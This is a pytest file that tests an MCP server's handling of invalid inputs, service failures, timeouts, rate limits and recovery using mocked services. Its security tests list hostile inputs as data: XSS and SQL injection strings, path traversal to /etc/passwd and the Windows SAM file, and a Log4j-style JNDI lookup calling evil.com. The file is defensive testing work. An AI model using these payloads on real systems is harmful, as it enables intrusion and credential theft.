"""Edge case and error handling tests for MCP server.

Comprehensive testing of:
- Invalid inputs and boundary conditions
- Error propagation and recovery
- Timeout handling
- Resource exhaustion scenarios
- Malformed requests
- Security edge cases
"""

import asyncio
from unittest.mock import AsyncMock, MagicMock

import pytest
from pydantic import ValidationError

from src.infrastructure.client_manager import ClientManager
from src.mcp_tools.models.requests import (
    DocumentRequest,
    EmbeddingRequest,
    SearchRequest,
)
from tests.mocks.mock_tools import MockMCPServer, register_mock_tools


class TestError(Exception):
    """Custom exception for this module."""


class TestMCPEdgeCases:
    """Test edge cases and error conditions for MCP server."""

    @pytest.fixture
    async def edge_case_client_manager(self):
        """Create client manager configured for edge case testing."""
        client_manager = MagicMock(spec=ClientManager)

        # Configure services for edge case testing
        mock_vector_service = AsyncMock()
        client_manager.vector_service = mock_vector_service

        _mock_embedding_service = AsyncMock()
        client_manager.embedding_service = _mock_embedding_service

        mock_crawling_service = AsyncMock()
        client_manager.crawling_service = mock_crawling_service

        mock_cache_service = AsyncMock()
        client_manager.cache_service = mock_cache_service

        mock_project_service = AsyncMock()
        client_manager.project_service = mock_project_service

        mock_deployment_service = AsyncMock()
        client_manager.deployment_service = mock_deployment_service

        mock_analytics_service = AsyncMock()
        client_manager.analytics_service = mock_analytics_service

        mock_hyde_service = AsyncMock()
        client_manager.hyde_service = mock_hyde_service

        return client_manager

    @pytest.fixture
    async def edge_case_server(self, edge_case_client_manager):
        """Create MCP server for edge case testing."""
        mcp = MockMCPServer("edge-case-test-server")
        register_mock_tools(mcp, edge_case_client_manager)
        return mcp, edge_case_client_manager

    # Input Validation Edge Cases

    async def test_empty_string_inputs(self, edge_case_server):
        """Test handling of empty string inputs."""
        mcp_server, mock_client_manager = edge_case_server

        # Test empty query string
        with pytest.raises(ValidationError):
            SearchRequest(query="", collection="docs")

        # Test empty collection name
        with pytest.raises(ValidationError):
            SearchRequest(query="test", collection="")

        # Test empty URL
        with pytest.raises(ValidationError):
            DocumentRequest(url="", collection="docs")

    async def test_extremely_long_inputs(self, edge_case_server):
        """Test handling of extremely long input strings."""
        mcp_server, mock_client_manager = edge_case_server

        # Create extremely long query (10MB)
        long_query = "a" * (10 * 1024 * 1024)

        search_tool = None
        for tool in mcp_server._tools:
            if tool.name == "search_documents":
                search_tool = tool
                break

        # Mock service to handle the request
        mock_client_manager.vector_service.search_documents.return_value = []

        # Should handle gracefully (either process or reject with appropriate error)
        try:
            result = await search_tool.handler(
                query=long_query,
                collection="docs",
                limit=5,
            )
            # If it processes, verify it returns valid result
            assert isinstance(result, list)
        except (TimeoutError, ConnectionError, RuntimeError, ValueError) as e:
            # If it rejects, should be a meaningful error
            error_msg = str(e).lower()
            assert "too long" in error_msg or "size" in error_msg

    async def test_special_characters_in_inputs(self, edge_case_server):
        """Test handling of special characters and Unicode."""
        mcp_server, mock_client_manager = edge_case_server

        search_tool = None
        for tool in mcp_server._tools:
            if tool.name == "search_documents":
                search_tool = tool
                break

        # Test various special character scenarios
        special_queries = [
            "test\x00null\x00byte",  # Null bytes
            "test\n\r\t whitespace",  # Special whitespace
            "emoji 🚀 🔥 test",  # Emojis
            "unicode测试テスト",  # Unicode characters
            "<script>alert('xss')</script>",  # Potential XSS
            "'; DROP TABLE users; --",  # SQL injection attempt
            "../../../etc/passwd",  # Path traversal
        ]

        mock_client_manager.vector_service.search_documents.return_value = [
            {"id": "special-1", "content": "Special char result", "score": 0.8}
        ]

        for query in special_queries:
            result = await search_tool.handler(
                query=query,
                collection="docs",
                limit=5,
            )
            # Should handle all special characters safely
            assert isinstance(result, list)

    async def test_boundary_value_limits(self, edge_case_server):
        """Test boundary values for numeric parameters."""
        mcp_server, mock_client_manager = edge_case_server

        # Test limit boundaries
        with pytest.raises(ValidationError):
            SearchRequest(query="test", limit=0)  # Below minimum

        with pytest.raises(ValidationError):
            SearchRequest(query="test", limit=101)  # Above maximum

        # Test batch size boundaries
        with pytest.raises(ValidationError):
            EmbeddingRequest(texts=["test"], batch_size=0)

        with pytest.raises(ValidationError):
            EmbeddingRequest(texts=["test"], batch_size=101)

        # Test valid boundary values
        valid_search = SearchRequest(query="test", limit=1)  # Minimum valid
        assert valid_search.limit == 1

        valid_search_max = SearchRequest(query="test", limit=100)  # Maximum valid
        assert valid_search_max.limit == 100

    # Service Failure Scenarios

    async def test_vector_service_connection_failure(self, edge_case_server):
        """Test handling when vector database is unavailable."""
        mcp_server, mock_client_manager = edge_case_server

        search_tool = None
        for tool in mcp_server._tools:
            if tool.name == "search_documents":
                search_tool = tool
                break

        # Simulate connection failure
        mock_client_manager.vector_service.search_documents.side_effect = (
            ConnectionError("Failed to connect to Qdrant at localhost:6333")
        )

        with pytest.raises(ConnectionError, match="Failed to connect to Qdrant"):
            await search_tool.handler(
                query="test query",
                collection="docs",
                limit=5,
            )

    async def test_embedding_service_timeout(self, edge_case_server):
        """Test handling of embedding service timeouts."""
        mcp_server, mock_client_manager = edge_case_server

        embedding_tool = None
        for tool in mcp_server._tools:
            if tool.name == "generate_embeddings":
                embedding_tool = tool
                break

        # Simulate timeout
        async def timeout_after_delay(*_args, **__kwargs):
            await asyncio.sleep(10)  # Long delay
            msg = "Embedding generation timed out"
            raise TimeoutError(msg)

        mock_client_manager.embedding_service.generate_embeddings = timeout_after_delay

        with pytest.raises(asyncio.TimeoutError):
            await asyncio.wait_for(
                embedding_tool.handler(texts=["test text"]),
                timeout=1.0,  # Short timeout
            )

    async def test_crawling_service_failure(self, edge_case_server):
        """Test handling of crawling service failures."""
        mcp_server, mock_client_manager = edge_case_server

        doc_tool = None
        for tool in mcp_server._tools:
            if tool.name == "add_document":
                doc_tool = tool
                break

        # Simulate various crawling failures
        crawl_errors = [
            ("Network timeout", TimeoutError("Request timed out")),
            ("404 Not Found", Exception("HTTP 404: Page not found")),
            ("SSL Error", Exception("SSL certificate verification failed")),
            ("Content too large", Exception("Content exceeds maximum size limit")),
        ]

        for _error_name, error in crawl_errors:
            mock_client_manager.crawling_service.crawl_url.side_effect = error

            with pytest.raises(type(error)):
                await doc_tool.handler(
                    url="https://example.com/test",
                    collection="docs",
                )

    # Resource Exhaustion Scenarios

    async def test_memory_exhaustion_handling(self, edge_case_server):
        """Test handling when approaching memory limits."""
        mcp_server, mock_client_manager = edge_case_server

        embedding_tool = None
        for tool in mcp_server._tools:
            if tool.name == "generate_embeddings":
                embedding_tool = tool
                break

        # Try to generate embeddings for huge text list
        huge_text_list = ["Large text " * 1000] * 100  # Very large input

        # Mock memory error
        mock_client_manager.embedding_service.generate_embeddings.side_effect = (
            MemoryError("Cannot allocate memory for embeddings")
        )

        with pytest.raises(MemoryError):
            await embedding_tool.handler(texts=huge_text_list)

    async def test_rate_limiting_scenarios(self, edge_case_server):
        """Test handling of rate limiting from external services."""
        mcp_server, mock_client_manager = edge_case_server

        search_tool = None
        for tool in mcp_server._tools:
            if tool.name == "search_documents":
                search_tool = tool
                break

        # Simulate rate limiting
        call_count = 0

        async def rate_limited_search(*_args, **__kwargs):
            nonlocal call_count
            call_count += 1
            if call_count > 3:  # Rate limit after 3 calls
                msg = "Rate limit exceeded: 429 Too Many Requests"
                raise TestError(msg)
            return [{"id": f"doc-{call_count}", "content": "Result", "score": 0.9}]

        mock_client_manager.vector_service.search_documents = rate_limited_search

        # First few calls should succeed
        for i in range(3):
            result = await search_tool.handler(
                query=f"rate test {i}",
                collection="docs",
                limit=5,
            )
            assert len(result) == 1

        # Subsequent calls should fail with rate limit error
        with pytest.raises(Exception, match="Rate limit exceeded"):
            await search_tool.handler(
                query="rate test 4",
                collection="docs",
                limit=5,
            )

    # Malformed Request Scenarios

    async def test_malformed_json_rpc_requests(self):
        """Test handling of malformed JSON-RPC requests."""
        # Test missing required fields
        malformed_requests = [
            {},  # Empty request
            {"jsonrpc": "2.0"},  # Missing id and method
            {"jsonrpc": "2.0", "id": "test"},  # Missing method
            {"jsonrpc": "2.0", "method": "tools/call"},  # Missing id
            {"jsonrpc": "1.0", "id": "test", "method": "tools/call"},  # Wrong version
            {
                "jsonrpc": "2.0",
                "id": "test",
                "method": "tools/call",
                "params": "not-an-object",
            },  # Invalid params type
        ]

        for request in malformed_requests:
            # In real MCP server, these would be rejected at protocol level
            assert (
                "jsonrpc" not in request
                or request.get("jsonrpc") != "2.0"
                or "id" not in request
                or "method" not in request
                or (
                    request.get("params") is not None
                    and not isinstance(request.get("params"), dict)
                )
            )

    async def test_invalid_tool_names(self, edge_case_server):
        """Test handling of requests for non-existent tools."""
        mcp_server, mock_client_manager = edge_case_server

        # Try to find non-existent tool
        non_existent_tool = None
        for tool in mcp_server._tools:
            if tool.name == "non_existent_tool":
                non_existent_tool = tool
                break

        assert non_existent_tool is None, "Non-existent tool should not be found"

    async def test_missing_required_parameters(self, edge_case_server):
        """Test handling of missing required parameters."""
        mcp_server, mock_client_manager = edge_case_server

        # Test with missing required fields
        with pytest.raises(ValidationError):
            SearchRequest()  # Missing all required fields

        with pytest.raises(ValidationError):
            DocumentRequest(collection="docs")  # Missing URL

        with pytest.raises(ValidationError):
            EmbeddingRequest()  # Missing texts

    # Concurrent Error Scenarios

    async def test_concurrent_service_failures(self, edge_case_server):
        """Test handling of multiple concurrent service failures."""
        mcp_server, mock_client_manager = edge_case_server

        # Find multiple tools
        tools = {}
        for tool in mcp_server._tools:
            if tool.name in [
                "search_documents",
                "generate_embeddings",
                "list_collections",
            ]:
                tools[tool.name] = tool

        # Configure all services to fail
        mock_client_manager.vector_service.search_documents.side_effect = Exception(
            "Vector DB error"
        )
        mock_client_manager.embedding_service.generate_embeddings.side_effect = (
            Exception("Embedding error")
        )
        mock_client_manager.vector_service.list_collections.side_effect = Exception(
            "Collection error"
        )

        # Execute all concurrently and collect errors
        tasks = [
            tools["search_documents"].handler(query="test", collection="docs", limit=5),
            tools["generate_embeddings"].handler(texts=["test"]),
            tools["list_collections"].handler(),
        ]

        results = await asyncio.gather(*tasks, return_exceptions=True)

        # All should fail with appropriate errors
        assert all(isinstance(r, Exception) for r in results)
        assert "Vector DB error" in str(results[0])
        assert "Embedding error" in str(results[1])
        assert "Collection error" in str(results[2])

    # Recovery and Retry Scenarios

    async def test_service_recovery_after_failure(self, edge_case_server):
        """Test that services can recover after transient failures."""
        mcp_server, mock_client_manager = edge_case_server

        search_tool = None
        for tool in mcp_server._tools:
            if tool.name == "search_documents":
                search_tool = tool
                break

        # Configure service to fail then succeed
        call_count = 0

        async def flaky_search(*_args, **__kwargs):
            nonlocal call_count
            call_count += 1
            if call_count <= 2:
                msg = "Temporary connection failure"
                raise ConnectionError(msg)
            return [{"id": "recovery-doc", "content": "Recovered", "score": 0.9}]

        mock_client_manager.vector_service.search_documents = flaky_search

        # First calls should fail
        for _i in range(2):
            with pytest.raises(ConnectionError):
                await search_tool.handler(
                    query="recovery test",
                    collection="docs",
                    limit=5,
                )

        # Third call should succeed
        result = await search_tool.handler(
            query="recovery test",
            collection="docs",
            limit=5,
        )
        assert len(result) == 1
        assert result[0]["content"] == "Recovered"

    # Security Edge Cases

    async def test_path_traversal_prevention(self, edge_case_server):
        """Test prevention of path traversal attacks."""
        mcp_server, mock_client_manager = edge_case_server

        # Test various path traversal attempts
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "file:///etc/passwd",
            "file://C:/Windows/System32/config/SAM",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
        ]

        doc_tool = None
        for tool in mcp_server._tools:
            if tool.name == "add_document":
                doc_tool = tool
                break

        for path in malicious_paths:
            # Should either reject or sanitize the path
            mock_client_manager.crawling_service.crawl_url.side_effect = Exception(
                "Invalid URL or access denied"
            )

            with pytest.raises(Exception, match="Invalid URL|access denied"):
                await doc_tool.handler(
                    url=path,
                    collection="docs",
                )

    async def test_injection_attack_prevention(self, edge_case_server):
        """Test prevention of injection attacks."""
        mcp_server, mock_client_manager = edge_case_server

        search_tool = None
        for tool in mcp_server._tools:
            if tool.name == "search_documents":
                search_tool = tool
                break

        # Test various injection attempts
        injection_queries = [
            "'; DROP TABLE vectors; --",  # SQL injection
            '{"$ne": null}',  # NoSQL injection
            "<script>alert('xss')</script>",  # XSS
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "{{7*7}}",  # Template injection
        ]

        # Service should safely handle all inputs
        mock_client_manager.vector_service.search_documents.return_value = []

        for query in injection_queries:
            result = await search_tool.handler(
                query=query,
                collection="docs",
                limit=5,
            )
            # Query should be treated as literal text, not executed
            assert isinstance(result, list)

    # Data Corruption Scenarios

    async def test_corrupted_response_handling(self, edge_case_server):
        """Test handling of corrupted service responses."""
        mcp_server, mock_client_manager = edge_case_server

        search_tool = None
        for tool in mcp_server._tools:
            if tool.name == "search_documents":
                search_tool = tool
                break

        # Return corrupted/invalid response structures
        corrupted_responses = [
            None,  # Null response
            "not a list",  # Wrong type
            [None, None],  # Null items
            [{"missing": "required fields"}],  # Missing required fields
            [{"id": "test", "content": None, "score": "not a number"}],  # Invalid types
        ]

        for response in corrupted_responses:
            mock_client_manager.vector_service.search_documents.return_value = response

            try:
                result = await search_tool.handler(
                    query="corruption test",
                    collection="docs",
                    limit=5,
                )
                # If it handles gracefully, verify result is valid
                assert isinstance(result, list)
            except (TimeoutError, ConnectionError, RuntimeError, ValueError) as e:
                # If it raises, should be a meaningful error
                error_msg = str(e).lower()
                assert "invalid" in error_msg or "corrupt" in error_msg

    async def test_partial_failure_handling(self, edge_case_server):
        """Test handling when some operations succeed and others fail."""
        mcp_server, mock_client_manager = edge_case_server

        # Test batch operations with partial failures
        embedding_tool = None
        for tool in mcp_server._tools:
            if tool.name == "generate_embeddings":
                embedding_tool = tool
                break

        # Configure to fail on specific inputs
        async def selective_failure(texts, **__kwargs):
            if any("fail" in text for text in texts):
                msg = "Cannot process texts containing 'fail'"
                raise TestError(msg)
            return {
                "embeddings": [[0.1] * 384 for _ in texts],
                "model": "test-model",
                "_total_tokens": len(texts) * 5,
            }

        mock_client_manager.embedding_service.generate_embeddings = selective_failure

        # Should succeed with normal texts
        result = await embedding_tool.handler(
            texts=["good text 1", "good text 2"],
        )
        assert len(result["embeddings"]) == 2

        # Should fail with problematic texts
        with pytest.raises(Exception, match="Cannot process texts containing 'fail'"):
            await embedding_tool.handler(
                texts=["good text", "this will fail", "another good text"],
            )

    # State Consistency Edge Cases

    async def test_state_consistency_after_errors(self, edge_case_server):
        """Test that server state remains consistent after errors."""
        mcp_server, mock_client_manager = edge_case_server

        project_tool = None
        for tool in mcp_server._tools:
            if tool.name == "create_project":
                project_tool = tool
                break

        # First call succeeds
        mock_client_manager.project_service.create_project.return_value = {
            "id": "project-1",
            "name": "Test Project",
            "created_at": "2024-01-01T00:00:00Z",
        }

        result1 = await project_tool.handler(
            name="Test Project",
            description="Test",
            quality_tier="balanced",
        )
        assert result1["id"] == "project-1"

        # Second call fails
        mock_client_manager.project_service.create_project.side_effect = Exception(
            "Database error"
        )

        with pytest.raises(Exception, match="Database error"):
            await project_tool.handler(
                name="Failed Project",
                description="This will fail",
                quality_tier="balanced",
            )

        # Third call should work again (state should be consistent)
        mock_client_manager.project_service.create_project.side_effect = None
        mock_client_manager.project_service.create_project.return_value = {
            "id": "project-3",
            "name": "Recovery Project",
            "created_at": "2024-01-01T00:00:00Z",
        }

        result3 = await project_tool.handler(
            name="Recovery Project",
            description="Should work",
            quality_tier="balanced",
        )
        assert result3["id"] == "project-3"
